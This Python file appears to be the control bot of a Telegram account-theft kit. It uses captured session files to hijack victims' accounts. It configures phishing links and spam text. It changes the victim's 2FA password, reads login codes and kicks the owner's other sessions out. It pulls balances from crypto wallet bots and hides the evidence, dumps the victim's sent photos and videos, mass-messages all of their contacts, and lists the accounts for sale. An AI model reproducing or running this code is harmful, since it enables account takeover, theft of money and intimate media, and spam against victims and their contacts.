import asyncio
import os
import shutil
import time

import aiogram
import telethon.events
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, \
    Message, CallbackQuery, ParseMode, InputFile
from aiogram.utils.callback_data import CallbackData
from aiogram import Bot, Dispatcher, executor, types
from telethon import TelegramClient, functions, events
from telethon.errors import FreshResetAuthorisationForbiddenError
from telethon.types import Message as MSG
from config import config,edit_config
from keyboard import service_kb
from telethon.tl.types.account import Authorizations
from telethon.tl.types import Authorization, InputMessagesFilterPhotos, InputMessagesFilterVideo, \
    InputMessagesFilterPhotoVideo, MessageMediaPhoto
import os

class get_text(StatesGroup):
    text = State()
    bot_text = State()
    bot_link = State()
    twofa_pass = State()
    twofa_hint = State()
    client_api = State()
    lolz_key = State()
    lolz_title = State()
    lolz_price=State()
    lolz_disc=State()
API_TOKEN = config('ADMIN_BOT') # bot token

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

def gen_msg():
    text = f'''
➖➖➖➖➖➖ ⚙️ <b>ɢᴇɴᴇʀᴀʟ</b> ⚙️ ➖➖➖➖➖➖
<b>🔮 Шаблон: </b>{config('templ')}
<b>💰 Автопродажа: </b>{'Вкл' if config('lolz')=='1' else 'Выкл'}
<b>🧬 Прокси: </b>{'Вкл' if config('proxy')=='1' else 'Выкл'}
<b>📡 Автоспам: </b>{'Вкл' if config('autosms')=='1' else 'Выкл'}
<b>💌 Текст спама: </b>{config('SPAM_MSG')}

➖➖➖➖➖➖ 🌐 <b>ᴘʜɪsʜɪɴɢ ʙᴏᴛ</b> 🌐 ➖➖➖➖➖➖
<b>📝 Фишинг приветствие: </b><i>{config('USER_MSG')}</i>
<b>🌐 Фишинг ссылка: </b><tg-spoiler><i>{config('USER_LINK')}</i></tg-spoiler>

➖➖➖➖➖➖ 🔒 <b>𝟐𝐅𝐀</b> 🔒 ➖➖➖➖➖➖
<b>🔐 Пароль: </b><tg-spoiler><i>{config('new_pass')}</i></tg-spoiler>
<b>🛎 Подсказка: </b><i>{config('new_hint')}</i>

➖➖➖➖➖➖ 💠 <b>sᴇssɪᴏɴ</b> 💠 ➖➖➖➖➖➖
<b>🛠 API_ID и API_HASH: </b><tg-spoiler><i>{config('api_id')}:{config('api_hash')}</i></tg-spoiler>

➖➖➖➖➖➖ ♻️ <b>ʟᴏʟᴢᴛᴇᴀᴍ</b> ♻️ ➖➖➖➖➖➖
<b>🔰 Заголовок: </b><i>{config('lolz_account_title')}</i>
<b>💰 Цена: </b><i>{config('lolz_account_price')}</i>
<b>⭐ Цена за премиум: </b><i>{config('lolz_account_premium_price')}</i>
<b>🔰 Описание: </b><i>{config('lolz_account_description')}</i>
<b>🔑 Ключ: </b> <tg-spoiler><i>{config('lolz_key')}</i></tg-spoiler>
    '''
    return text
def gen_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(text='❌ Выключить автопродажу',callback_data='asell*off') if config('lolz') == '1' else InlineKeyboardButton(text='✅ Включить автопродажу',callback_data='asell*on'))
    kb.add(InlineKeyboardButton(text='❌ Выключить прокси',callback_data='proxy*off') if config('proxy') == '1' else InlineKeyboardButton(text='✅ Включить прокси',callback_data='proxy*on'))
    kb.add(InlineKeyboardButton(text='❌ Выключить автоспам',callback_data='autosms*off') if config('autosms') == '1' else InlineKeyboardButton(text='✅ Включить автоспам',callback_data='autosms*on'))
    kb.add(InlineKeyboardButton(text='🔮 Изменить шаблон',callback_data='templ'))
    kb.add(InlineKeyboardButton(text='💌 Изменить текст рассылки',callback_data='spam_text_chg'))
    kb.add(InlineKeyboardButton(text='📝 Изменить фишинг приветствие',callback_data='user_text_chg'))
    kb.add(InlineKeyboardButton(text='🌐 Изменить фишинг ссылку',callback_data='user_link_chg'))
    kb.add(InlineKeyboardButton(text='🔐 Изменить 2FA пароль',callback_data='2fa_pass'))
    kb.add(InlineKeyboardButton(text='🛎 Изменить 2FA подсказку',callback_data='2fa_hint'))
    kb.add(InlineKeyboardButton(text='🛠 Изменить API_ID и API_HASH',callback_data='client_api'))
    kb.add(InlineKeyboardButton(text='🔑 Изменить лолз ключ',callback_data='lolz_api'))
    kb.add(InlineKeyboardButton(text='🔰 Изменить лолз заголовок',callback_data='lolz_title'))
    kb.add(InlineKeyboardButton(text='💰 Изменить лолз цены',callback_data='lolz_price'))
    kb.add(InlineKeyboardButton(text='🔰 Изменить лолз описание',callback_data='lolz_disc'))
    return kb
def get_templs():
    kb = InlineKeyboardMarkup()
    templs_list = os.listdir('templates')
    for templ in templs_list:
        kb.add(InlineKeyboardButton(text=templ, callback_data=f'set_templ*{templ}'))
    return kb
@dp.message_handler(commands='test')
async def test(msg:Message):
    await msg.answer('Тест', reply_markup=service_kb('84922346335'))
@dp.callback_query_handler(Text(startswith="lolz_disc"))
async def lolz_title_ch(call:CallbackQuery):
    await call.message.edit_text('Введи новое описание для аккаунтов на лолз или /cancel для отмены:')
    await get_text.lolz_disc.set()
@dp.message_handler(state=get_text.lolz_disc)
async def lolz_title_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('lolz_account_description',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="lolz_price"))
async def lolz_title_ch(call:CallbackQuery):
    await call.message.edit_text('Введи новыe цены для обычного и премиум аккаунтов через ":" или /cancel для отмены:')
    await get_text.lolz_price.set()
@dp.message_handler(state=get_text.lolz_price)
async def lolz_title_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('lolz_account_price', msg.text.split(':')[0])
    edit_config('lolz_account_premium_price', msg.text.split(':')[1])
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="lolz_title"))
async def lolz_title_ch(call:CallbackQuery):
    await call.message.edit_text('Введи новый лолз заголовок или /cancel для отмены:')
    await get_text.lolz_title.set()
@dp.message_handler(state=get_text.lolz_title)
async def lolz_title_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('lolz_account_title',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="lolz_api"))
async def lolz_key_ch(call:CallbackQuery):
    await call.message.edit_text('Введи новый лолз ключ или /cancel для отмены:')
    await get_text.lolz_key.set()
@dp.message_handler(state=get_text.lolz_key)
async def lolz_key_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('lolz_key',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="client_api"))
async def client_api_ch(call:CallbackQuery):
    await call.message.edit_text('Введи новые API_ID и PI_HASH через ":" или /cancel для отмены:')
    await get_text.client_api.set()
@dp.message_handler(state=get_text.client_api)
async def client_api_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('api_id',msg.text.split(':')[0])
    edit_config('api_hash',msg.text.split(':')[1])
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="2fa_hint"))
async def twofa_hint_change(call:CallbackQuery):
    await call.message.edit_text('Введи новую 2фа подсказку /cancel для отмены:')
    await get_text.twofa_hint.set()
@dp.message_handler(state=get_text.twofa_hint)
async def twofa_hint_change_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('new_hint',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="2fa_pass"))
async def twofa_pass_change(call:CallbackQuery):
    await call.message.edit_text('Введи новый 2фа пароль /cancel для отмены:')
    await get_text.twofa_pass.set()
@dp.message_handler(state=get_text.twofa_pass)
async def twofa_pass_change_st(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('new_pass',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.message_handler(commands='cancel',state='*')
async def cancel(msg:Message,state:FSMContext):
    await state.finish()
    await msg.bot.delete_message(msg.chat.id, msg.message_id - 1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="user_link_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новую ссылку либо /cancel для отмены:')
    await get_text.bot_link.set()
@dp.message_handler(state=get_text.bot_link)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('user_link',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="user_text_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новое сообщение либо /cancel для отмены:')
    await get_text.bot_text.set()
@dp.message_handler(state=get_text.bot_text)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('user_msg',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="spam_text_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новый текст рассылки либо /cancel для отмены:')
    await get_text.text.set()
@dp.message_handler(state=get_text.text)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('spam_msg',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.message_handler(commands='settings')
async def settings(message:Message):
    await message.answer(gen_msg(),parse_mode=ParseMode.HTML,reply_markup=gen_kb())

@dp.callback_query_handler(Text(startswith="asell"))
async def autosell_toggle(call:CallbackQuery):
    if call.data.split('*')[1]== 'on':
            edit_config('lolz','1')
    elif call.data.split('*')[1]=='off':
            edit_config('lolz', '0')
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="autosms"))
async def autosms_toggle(call:CallbackQuery):
    if call.data.split('*')[1]== 'on':
            edit_config('autosms','1')
    elif call.data.split('*')[1]=='off':
            edit_config('autosms', '0')
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="proxy"))
async def proxy_toggle(call:CallbackQuery):
    if call.data.split('*')[1]== 'on':
            edit_config('proxy','1')
    elif call.data.split('*')[1]=='off':
            edit_config('proxy', '0')
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="templ"))
async def choise_templ(call:CallbackQuery):
    await call.message.edit_text('Выберите шаблон: ',reply_markup=get_templs())
@dp.callback_query_handler(Text(startswith="set_templ"))
async def set_templ(call:CallbackQuery):
    edit_config('templ',call.data.split('*')[1])
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="spam"))
async def spam(call:CallbackQuery):
    await call.answer('Началась рассылка ⌚')
    session = 'sessions/'+call.data.split('*')[1]+'.session'
    client = TelegramClient(session, int(config('API_ID')),config('API_HASH'))
    await client.connect()
    dialogs = client.iter_dialogs()
    async for dialog in dialogs:
        try:
            if dialog.entity.bot:
                continue
            msg_obj = await client.send_message(dialog,config('SPAM_MSG'))
            await client.delete_messages(dialog,msg_obj.id,revoke=False)
        except:
            continue
    await client.disconnect()
async def mute(client:TelegramClient,tg_dialog):
    MUTE_CHAT_RIGHTS = {
        "send_messages": False,
        "send_media": False,
        "send_stickers": False,
        "send_gifs": False,
        "send_games": False,
        "send_inline": False,
        "send_polls": False,
    }
    try:
        await client.edit_permissions(tg_dialog, **MUTE_CHAT_RIGHTS)
    except:
        pass
@dp.callback_query_handler(Text(startswith='crypto'))
async def crypto(call:CallbackQuery):
    print(call.data)
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    crypto = ''
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            if dialog.entity.bot:
                if dialog.entity.username == "wallet":
                    await mute(client,dialog)
                    await dialog.send_message('/start')
                    await dialog.send_message('/wallet')
                    await asyncio.sleep(1)
                    await client.send_read_acknowledge(dialog)
                    msg = await client.get_messages(dialog.entity)
                    if msg[0].text == '/wallet':
                        await asyncio.sleep(1)
                        await client.send_read_acknowledge(dialog)
                        msg = await client.get_messages(dialog.entity)
                    await client(functions.messages.DeleteHistoryRequest(dialog, 9999999, just_clear=True))
                    crypto += '\n========== @walet ===========\n' + msg[0].text
                if dialog.entity.username == "CryptoBot":
                    await mute(client, dialog)
                    await dialog.send_message('/start')
                    await dialog.send_message('/wallet')
                    await asyncio.sleep(1)
                    await client.send_read_acknowledge(dialog)
                    msg = await client.get_messages(dialog.entity)
                    if msg[0].text == '/wallet':
                        await asyncio.sleep(1)
                        await client.send_read_acknowledge(dialog)
                        msg = await client.get_messages(dialog.entity)
                    await client(functions.messages.DeleteHistoryRequest(dialog, 9999999, just_clear=True))
                    crypto += '\n========== @CryptoBot ===========\n' + msg[0].text
    if crypto:
        keyboard = aiogram.types.InlineKeyboardMarkup()
        keyboard.add(
            aiogram.types.InlineKeyboardButton(text='🤑 Проверить крипту', callback_data=f'crypto*{session}'))
        keyboard.add(aiogram.types.InlineKeyboardButton(text='📨 Спам', callback_data=f'spam*{session}'))
        await call.message.edit_caption(call.message.caption+crypto,parse_mode=aiogram.types.ParseMode.MARKDOWN,reply_markup=keyboard)
        await call.answer('')
    else:
        await call.answer('Кошельки не найдены')
    print(call.message.text)
    await client.disconnect()
@dp.callback_query_handler(Text(startswith='2fa'))
async def tfa(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    password = call.data.split('*')[2]
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    await client.edit_2fa(current_password=password, new_password=config('NEW_PASS'), hint=config('NEW_HINT'))
    await client.delete_dialog(777000)
    await client.disconnect()
    await call.answer('2fa изменен')
@dp.callback_query_handler(Text(startswith='check'))
async def check_valid(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    try:
        await client.connect()
        if await client.get_me():
            await call.answer('✅ Валид')
        else:
            await call.answer('❌ Не валид')
    except Exception as e:
        await call.answer(f'Ошибка: {e}')
    await client.disconnect()
@dp.callback_query_handler(Text(startswith='code'))
async def get_code(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    tg_chat = await client.get_entity(777000)
    msg = await client.get_messages(tg_chat,limit=1)
    if 'code' in msg[0].message:
        await call.answer()
        await call.message.answer(msg[0].message.split(':')[1].split('.')[0])
    else:
        await call.answer('❌ Код не найден')
    await client.disconnect()
@dp.callback_query_handler(Text(startswith='sessions_close'))
async def close_sessions(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    sessions:Authorizations = await client(functions.account.GetAuthorizationsRequest())
    for session in  sessions.authorizations:
        session_obj:Authorization = session
        print(session_obj)
        if session_obj.hash:
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=session_obj.hash))
            except FreshResetAuthorisationForbiddenError:
                await call.answer('❌ Нужна отлега, невозможно закрыть новые сеансы')
                break
    await client.disconnect()
def to_zip(path:str):
    shutil.make_archive(path, 'zip', path)
    shutil.rmtree(path)
    return path+'.zip'
@dp.callback_query_handler(Text(startswith='damp'))
async def close_sessions(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    me = await client.get_me()
    msgs_for_damp = []
    await call.answer('⏳ Начался сбор сообщений')
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            if dialog.entity.bot:
                continue
            if dialog.id == 777000:
                continue
            print(dialog.name)
            async for msg in client.iter_messages(dialog,filter=InputMessagesFilterPhotoVideo,from_user=me):
                msgs_for_damp.append(msg)
    if msgs_for_damp:
        count_dump = len(msgs_for_damp)
        status_msg = await call.message.answer(f'✅ Найдено {count_dump} сообщений!')
        path = f'dumps/{me.id}-{int(time.time())}'
        path_photo = f'dumps/{me.id}-{int(time.time())}/photo'
        path_video = f'dumps/{me.id}-{int(time.time())}/video'
        os.mkdir(path)
        os.mkdir(path_photo)
        count = 0
        video = []
        for msg in msgs_for_damp:
            print(f'⏳ Скачивание медиа из сообщения: {msg}')
            await status_msg.edit_text(f'⏰ Статус скачивания: {count}/{count_dump}')
            media:MessageMediaPhoto = msg.media
            try:
                if msg.media.photo:
                    try:
                        await client.download_media(msg,file=path_photo,thumb=len(media.photo.sizes)-2 if len(media.photo.sizes)>3 else 1 )
                    except Exception as e:
                        print(e)
                count+=1

            except AttributeError:
                video.append(msg)

                count+=1
        await status_msg.reply_document(InputFile(to_zip(path_photo)),caption='📸 Фото')
        if video:
            os.mkdir(path_video)
            for msg in video:
                try:
                    await client.download_media(msg, file=path_video)
                except Exception as e:
                    print(e)
        await status_msg.reply_document(InputFile(to_zip(path_video)),caption='🎥 Видео')

    else:
        await call.answer('❌ Нет файлов для дампа')

    await client.disconnect()
@dp.callback_query_handler(Text(startswith='vspam'))
async def widget_spam(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    await client.send_message(await client.get_entity(config('user_bot_username')),'/wg')
    @client.on(telethon.events.NewMessage(from_users=await client.get_entity(config('user_bot_username'))))
    async def vspam_start():
        msg = await client.get_messages(await client.get_entity(config('user_bot_username')),limit=1)
        dialogs = client.iter_dialogs()
        async for dialog in dialogs:
            try:
                if dialog.entity.bot:
                    continue
                msg_obj = await client.forward_messages(await client.get_entity(config('user_bot_username')),msg[0])
                await client.delete_messages(dialog, msg_obj.id, revoke=False)
            except:
                continue
        await client.disconnect()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)